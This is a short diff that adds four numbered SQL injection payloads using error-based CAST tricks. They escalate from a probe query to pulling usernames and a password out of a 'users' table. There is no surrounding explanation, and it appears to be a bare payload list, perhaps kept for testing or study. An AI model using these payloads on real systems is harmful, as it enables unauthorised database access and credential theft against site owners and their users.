@@ -1,0 +1,4 @@
+1.AND CAST((SELECT 1) as int)--
+2.AND 1=CAST((SELECT 1) as int)--
+3.AND 1=CAST((SELECT username from users) as int)--
+4.' AND 1=CAST((SELECT password from users LIMIT 1) as int)--
